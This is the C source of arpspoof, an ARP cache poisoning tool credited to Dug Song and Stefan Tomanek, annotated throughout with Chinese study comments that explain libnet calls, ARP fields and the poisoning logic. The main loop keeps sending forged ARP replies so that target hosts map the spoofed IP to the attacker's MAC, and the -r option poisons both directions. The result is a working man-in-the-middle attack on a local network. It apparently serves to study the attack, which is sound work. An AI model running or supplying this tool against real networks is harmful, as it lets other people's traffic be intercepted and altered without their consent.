/*
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 * Improved 2011 by Stefan Tomanek <stefa@pico.ruhr.de>
 */

#include "arpspoof.h"

#define VERSION "1.0"

// 定义主机的结构,包括IP地址和MAC地址
typedef struct host {
    in_addr_t ip;
    struct ether_addr mac;
}host;

static libnet_t *l;
// spoof.ip是目标机器里的arp条目，也就是我们要把目标缓存中spoof.ip的mac改变成我们自己的来欺骗目标
static host spoof = {0};
static host *targets;
// intf就是网卡接口，如"eth0"
static char *intf;
static int poison_reverse;

// typedef unsigned char uint8_t;
// uint8_t 实际上是unsigned char
static uint8_t *my_ha = NULL;
// 广播地址
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void usage(void) 
{
    fprintf(stdout, "Version: " VERSION "\n"
            "Usage: arpspoof [-i interface]"
            " [-t target] [-r] spoof\n"
            "Ctrl + c to quit\n");
    exit(1);
}

// in_addr_t通常为32位unsigned int,用来表示ipv4地址,也可以包含在in_addr结构体中
//
// http://www.manpagez.com/man/3/ether_addr/
// The number of bytes in an ethernet (MAC) address.
// #define ETHER_ADDR_LEN   6
// Structure of a 48-bit Ethernet address.
// struct  ether_addr {
//     u_char octet[ETHER_ADDR_LEN];
// };
//
// arpreq是个结构体,包含操作arp表需要的东西
// unix网络编程17.8节的例子和这个函数很像,这个函数就是获得相应ip的地址是否已经在arp缓存里了
// 参数说明:ip就是ipv4,ether就是mac地址,lif就是网卡接口,如"eth1"
int arp_cache_lookup(in_addr_t ip, 
                struct ether_addr *ether, const char* lif) {
    int sock;
    struct arpreq arpreq;
    struct sockaddr_in *sin;

    memset((char *)&arpreq, 0, sizeof(arpreq));
    strncpy(arpreq.arp_dev, lif, strlen(lif));
    sin = (struct sockaddr_in *)&arpreq.arp_pa;
    sin->sin_family = AF_INET;
    sin->sin_addr.s_addr = ip;

    // ???没搞懂这里为什么要用SOCK_DGRAM,找不到解释,
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        close(sock);
        perror("socket error");
        return(-1);
    }

    // typedef void *caddr_t;    内核源码里定义的
    // https://bbs.csdn.net/topics/80349892
    if (ioctl(sock, SIOCGARP, (caddr_t)&arpreq) == -1) {
        close(sock);
        return(-1);
    }
    close(sock);
    // ETHER_ADDR_LEN = 6
    memcpy(ether->ether_addr_octet, arpreq.arp_ha.sa_data, ETHER_ADDR_LEN);
    printf("arp_cache_lookup:%s is at %s\n", 
            libnet_addr2name4(ip, LIBNET_DONT_RESOLVE),
            ether_ntoa(ether));

    return(0);
}

// 发送ARP包的函数
// ???参数1:l:libnet链路层接口,通过这个接口可以操作链路层
// 参数2:op:来指定ARP包的操作,请求还是应答
// 参数3:sha:sender's hardware address,ARP请求或应答的源MAC地址,请求的话为空,应答的话欺骗时为本机硬件地址,cleanup时为目的IP对应正确的MAC
// 参数4:spa:sender's protocol address,ARP封装里的源IP地址
// 参数5:tha:target hardware address,ARP封装里的目标MAC地址,
// 参数6:tpa:targer protocol address,ARP封装里的目标IP地址,也就是想要欺骗的对象,更改其ARP缓存
// 参数7:me:我的硬件地址,或NULL,用作以太网表头的源MAC
//
// u_int8_t是什么类型int是平台相关的，他可能是2个字节，也可能是4个字节。u_int8_t是平台无关的，在任何平台下，他都是代表8位无符号数，表示一个字节。u表示unsigned，int8表示8位（一个字节），t是系统数据类型的意思。
// 这里的spa和tpa都是网络字节序
static int arp_send(libnet_t *l, int op, u_int8_t *sha, in_addr_t spa, 
        u_int8_t *tha, in_addr_t tpa, u_int8_t *me) {
    int retval;

    if (!me)
        me = sha;
    // libnet_autobuild_arp为构造ARP数据包的函数
    libnet_autobuild_arp(op, sha, (u_int8_t *)&spa, tha,
            (u_int8_t *)&tpa, l);
    // libnet_build_ethernet为构造以太网数据包的函数
    libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
#ifdef DEBUG
    fprintf(stdout, "sha is %s\n", 
        ether_ntoa((struct ether_addr *)sha));
    fprintf(stdout, "spa is %s\n", 
        libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
    fprintf(stdout, "tha is %s\n", 
        ether_ntoa((struct ether_addr *)tha));
    fprintf(stdout, "tpa is %s\n", 
        libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE));
#endif
    // 输出me参数,硬件地址
    // 格式是0a:ac:28:d2:66:51
    // ether_ntoa网络字节序ether_addr转换成字符串
    fprintf(stdout, "%s ", ether_ntoa((struct ether_addr *)me));
    if (op == ARPOP_REQUEST) {
        fprintf(stdout, "> %s 0806: Arp request who-has %s tell %s\n", 
                ether_ntoa((struct ether_addr *)tha),
                libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
                libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
    } else {
        // 这里一定要写成两个fprintf，这是ether_ntoa的一个陷阱，
        // 下面用inet_ntoa来解释，之前找了得有一个小时这个错误，好坑
        // inet_ntoa()“自作聪明”地把内部的static char[]返回了，而我们的程序正是踩中了这个陷阱。让我们来分析一下fprintf代码。在我们fprintf时，编译器先计算inet_ntoa(des)，于是其返回一个字符串的地址，然后程序再去求inet_ntoa(src)表达式，又得到一个字符串的地址。这两个字符串的地址都是inet_ntoa()中那个static char[]，显然是同一个地址，而第二次求src的IP时，这个值的des的IP地址内容必将被src的IP覆盖。所以，这两个表达式的字符串内存都是一样的了，此时，程序会调用fprintf把这两个字符串（其实是一个）输出到文件。
        fprintf(stdout, "> %s 0806: Arp reply %s is-at ", 
                ether_ntoa((struct ether_addr *)tha),
                libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
        fprintf(stdout, "%s\n",
                ether_ntoa((struct ether_addr *)sha));
    }
    retval = libnet_write(l);
    if (retval) {
        fprintf(stdout, "%s\n", libnet_geterror(l));
    }

    libnet_clear_packet(l);
    return retval;
}

static int arp_force(in_addr_t dst)
{
    struct sockaddr_in sin;
    int i, fd;

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
        return(1);

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = dst;
    sin.sin_port = htons(67);

    i = sendto(fd, NULL, 0, 0, (struct sockaddr*)&sin, sizeof(sin));

    close(fd);

#ifdef DEBUG
    fprintf(stdout, "arp_force to %s is complete\n", 
            libnet_addr2name4(dst, LIBNET_DONT_RESOLVE));
#endif

    return(0);
}

// 应该就是寻找ip对应的mac，以指针形式返回mac
// 返回1表示找到了，返回0表示没找到
// arp_find会先看本机arp缓存表，缓存没有的话arp_send进行request，请求完了再查arp缓存表
static int arp_find(in_addr_t ip, struct ether_addr *mac)
{
    int i = 0;
    do {
        // 先从自己的缓存里寻找，有的话直接返回
        if (arp_cache_lookup(ip, mac, intf) == 0)
            return(1);
        // ？？这里为什么Linux内核不能直接发送arp请求呢？？
        #ifdef __linux__
        // 强制发送一个空的UDP包，以让ARP缓存表中有这条项目，之后调用arp_cache_lookup
        arp_force(ip);
        #else
        // ？？这个包貌似没有以太网起始地址和目的地址，怎么发包呢
        arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
        #endif
        sleep(1);
    } while(i++ < 3);

    return(0);
}

// 只有cleanup调用了
// 成功的找到所有ip的mac则返回1，否则返回0
static int arp_find_all() {
    struct host *target = targets;
    while (target->ip) {
        // 原文这里每条成功返回mac就会return 1，我觉得这样只能获取第一个target的ip，其他target无法获取，会出错
        if (!arp_find(target->ip, &target->mac))
            return 0;
        target++;
    }
    return(1);
}

static void cleanup(int sig)
{
    // 用arp_find获取spoof的mac
    int fw = arp_find(spoof.ip, &spoof.mac);
    int bw = poison_reverse && targets[0].ip && arp_find_all();
    int i;
    // rounds的目的大概就是多清楚几次，防止清除不成功
    int rounds = (cleanup_src_own * 5 + cleanup_src_host * 5);
    uint8_t *src_ha = NULL;

    fprintf(stdout, "Cleaning up and re-arping targets...\n");
    for (i = 0; i < rounds; i++) {
        struct host *target = targets;
        while(target->ip) {
            // ？？clean_src_own为0的话，之后arp应答的包岂不是没有源mac
            if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
                src_ha = my_ha;
            }
            // ARP reply既可以时广播也可以时单播，普遍是单播，但免费ARP是广播
            if (fw) {
                // 恢复target内ARP缓存表spoof.ip对应的正确mac
                arp_send(l, ARPOP_REPLY, 
                        (u_int8_t *)&spoof.mac, spoof.ip,
                        (target->ip ? (u_int8_t *)&target->mac : brd_ha), 
                        target->ip, src_ha);
                sleep(1);
            }
            if (bw) {
                // 当使用了-r时，要同时恢复spoof主机ARP缓存表target->ip对应的正确mac
                arp_send(l, ARPOP_REPLY,
                        (u_int8_t *)&target->mac, target->ip, 
                        (u_int8_t *)&spoof.mac, spoof.ip, 
                        src_ha);
                sleep(1);
            }
            target++;
        }
    }
    exit(0);
}

int main(int argc, char *argv[])
{
    int n_targets;
    int c;
    char pcap_ebuf[PCAP_ERRBUF_SIZE];
    char libnet_ebuf[LIBNET_ERRBUF_SIZE];
    char *cleanup_src = NULL;

    spoof.ip = 0;
    intf = NULL;
    poison_reverse = 0;
    n_targets = 0;

    // allocate enough memory for target list
    targets = calloc(argc + 1, sizeof(struct host));

    // pcap_lookupdev和libnet_init原文在switch后了，但-t里的libnet_name2addr4貌似无法使用，就挪到前面来了
    // pcap_lookupdev就是获取网卡接口，如"eth0"
    if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
        errx(1, "%s", pcap_ebuf);
    else
        fprintf(stdout, "intf is %s\n", intf);

    // libnet_init这个函数存在于libnet库中，作用是打开intf指向的网络链路设备,错误信息存入libnet_ebuf中。
    // LIBNET_LINK可以在链路层基础上构造ARP或IP等包
    // LIBNET_RAW4则只能在网络层基础上构造UDP或IP等包
    if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
        errx(1, "%s", libnet_ebuf);

    // 下面的h?V这三个参数没搞懂
    while ((c = getopt(argc, argv, "ri:t:c:h?V")) != -1) {
        switch(c) {
        // intf表示网络接口,如eth0
        case 'i':
            intf = optarg;
            break;
        // t表示要欺骗的主机，也就是更改此主机相应的ARP缓存表
        // libnet_name2addr4将域名或点分十进制形式的IP转化成网络字节序
        case 't':
            if ((targets[n_targets++].ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
                usage();
            break;
        // 如果没有-r则只欺骗target主机,有的话则同时欺骗target主机和spoof主机
        case 'r':
            poison_reverse = 1;
            break;
        case 'c':
            cleanup_src = optarg;
            break;
        case 'h':
        case '?':
            usage();
        }
    }
    // 这两个还是很重要，不然之后使用argv[0]获取spoof的ip时会出错
    argc -= optind;
    argv += optind;

    if (argc != 1)
        usage();
    if (poison_reverse && !n_targets) {
        usage();
        // 经试验err() family在调用后程序立即退出，后面的程序不会运行，原文顺序有错
        errx(1, "Spoofing the reverse path (-r) is only available when specifying a target (-t).");
    }

    // ？？clean_src_own和clean_src_host的意义是什么
    if (!cleanup_src || strcmp(cleanup_src, "own") == 0) {
        cleanup_src_own = 1;
        cleanup_src_host = 0;
    } else if (strcmp(cleanup_src, "host") == 0) {
        cleanup_src_own = 0;
        cleanup_src_host = 1;
    } else if (strcmp(cleanup_src, "both") == 0) {
        cleanup_src_own = 1;
        cleanup_src_host = 1;
    } else {
        usage();
        errx(1, "Invalid parameter to -c: use 'own'(default), 'host', or 'both'.");
    }

    if ((spoof.ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
        usage();

    // 寻找每个target主机的mac，否则arp表头没有目的mac，无法发送
    struct host *target = targets;
    while (target->ip) {
        if (target->ip != 0 && !arp_find(target->ip, &target->mac))
            errx(1, "Couldn't arp for target host %s",
                    libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
        target++;
    }
    // 寻找每个spoof主机的mac，否则arp表头没有目的mac，无法发送
    if (poison_reverse) {
        if (!arp_find(spoof.ip, &spoof.mac)) {
            errx(1, "Couldn't arp for spoof host %s",
                    libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
        }
    }

    // 获取本机MAC地址
    if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
        errx(1, "Unable to determine own mac address");
    }

    // 终端关闭会收到SIGHUP，Ctrl+C会收到SIGINT
    // kill命令默认产生SIGTERM，不过kill也可以发送其他所有信号
    // 收到这三个信号会调用cleanup来恢复被欺骗主机的ARP缓存
    signal(SIGHUP, cleanup);
    signal(SIGINT, cleanup); 
    signal(SIGTERM, cleanup);

    // 只要不终止程序就不停的欺骗
    for ( ; ; ) {
        host *target = targets;
        while (target->ip) {
#ifdef DEBUG
            fprintf(stdout, "(sha)src mac is %s\n", 
                ether_ntoa((struct ether_addr *)my_ha));
            fprintf(stdout, "(spa)src ip is %s\n", 
                libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
            fprintf(stdout, "(tha)dst mac is %s\n", 
                ether_ntoa((struct ether_addr *)&target->mac));
            fprintf(stdout, "(tpa)dst ip is %s\n", 
                libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
#endif
            // 将target主机ARP缓存表里spoof.ip对应的mac变成自己的
            arp_send(l, ARPOP_REPLY, my_ha, spoof.ip, 
                    (target->ip ? (u_int8_t *)&target->mac: brd_ha),
                    target->ip,
                    my_ha);
            // 将spoof主机ARP缓存表里target.ip对应的mac变成自己的
            if (poison_reverse) {
                arp_send(l, ARPOP_REPLY, my_ha, target->ip, 
                        (u_int8_t *)&spoof.mac, spoof.ip, my_ha);
            }
            target++;
        }
        sleep(3);
    }
}
